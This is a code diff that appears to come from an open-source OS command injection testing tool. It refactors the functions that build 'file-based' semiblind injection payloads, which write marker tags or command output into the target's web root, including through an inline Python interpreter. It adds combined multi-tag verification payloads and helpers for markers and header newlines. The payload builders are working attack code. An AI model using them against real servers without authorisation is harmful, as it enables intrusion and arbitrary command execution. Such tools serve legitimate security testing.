@@ -18,7 +18,6 @@ The "file-based" technique on semiblind OS command injection.
 The available "file-based" payloads.
 """
 
-from src.utils import menu
 from src.utils import settings
 from src.core.injections.controller import checks
 
@@ -38,9 +37,20 @@ def decision(separator, TAG, OUTPUT_TEXTFILE):
               "echo " + TAG + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
               )
 
-    if settings.CUSTOM_INJECTION_MARKER:
-      payload = payload + separator
+    payload = checks.append_custom_marker(payload, separator)
 
+  return payload
+
+"""
+Combined multi-tag decision payload for false-positive verification (Unix only).
+"""
+def decision_combined(separator, tags, OUTPUT_TEXTFILE):
+  writes = []
+  for index, tag in enumerate(tags):
+    operator = settings.FILE_WRITE_OPERATOR if index == 0 else settings.FILE_APPEND_OPERATOR
+    writes.append("echo " + tag + operator + settings.WEB_ROOT + OUTPUT_TEXTFILE)
+  payload = separator + separator.join(writes)
+  payload = checks.append_custom_marker(payload, separator)
   return payload
 
 """
@@ -59,18 +69,24 @@ def decision_alter_interpreter(separator, TAG, OUTPUT_TEXTFILE):
               settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" + TAG + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX
                )
 
-    if settings.CUSTOM_INJECTION_MARKER:
-      payload = payload + separator
+    payload = checks.append_custom_marker(payload, separator)
 
-  # New line fixation
-  if settings.USER_AGENT_INJECTION == True or \
-     settings.REFERER_INJECTION == True or \
-     settings.HOST_INJECTION == True or \
-     settings.CUSTOM_HEADER_INJECTION == True :
-    payload = payload.replace(settings.END_LINE.LF, separator)
-  else:
-    if settings.TARGET_OS != settings.OS.WINDOWS:
-      payload = payload.replace(settings.END_LINE.LF,"%0d")
+  payload = checks.fix_newlines_for_headers(payload, separator)
+
+  return payload
+
+"""
+Combined multi-tag decision_alter_interpreter payload for false-positive verification (Unix only).
+"""
+def decision_combined_alter_interpreter(separator, tags, OUTPUT_TEXTFILE):
+  writes = "".join("f.write('" + tag + "')\n" for tag in tags)
+  payload = (separator +
+            settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\n" + writes + "f.close()\n\"" + settings.CMD_SUB_SUFFIX
+             )
+
+  payload = checks.append_custom_marker(payload, separator)
+
+  payload = checks.fix_newlines_for_headers(payload, separator)
 
   return payload
 
@@ -94,8 +110,7 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
               cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
               )
 
-    if settings.CUSTOM_INJECTION_MARKER:
-      payload = payload + separator
+    payload = checks.append_custom_marker(payload, separator)
 
   return payload
 
@@ -122,18 +137,9 @@ def cmd_execution_alter_interpreter(separator, cmd, OUTPUT_TEXTFILE):
               settings.CMD_SUB_PREFIX + "echo " + cmd_exec + settings.CMD_SUB_SUFFIX + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX
               )
 
-    if settings.CUSTOM_INJECTION_MARKER:
-      payload = payload + separator
+    payload = checks.append_custom_marker(payload, separator)
 
-  # New line fixation
-  if settings.USER_AGENT_INJECTION == True or \
-     settings.REFERER_INJECTION == True or \
-     settings.HOST_INJECTION == True or \
-     settings.CUSTOM_HEADER_INJECTION == True:
-    payload = payload.replace(settings.END_LINE.LF, separator)
-  else:
-    if settings.TARGET_OS != settings.OS.WINDOWS:
-      payload = payload.replace(settings.END_LINE.LF,"%0d")
+  payload = checks.fix_newlines_for_headers(payload, separator)
 
   return payload
 
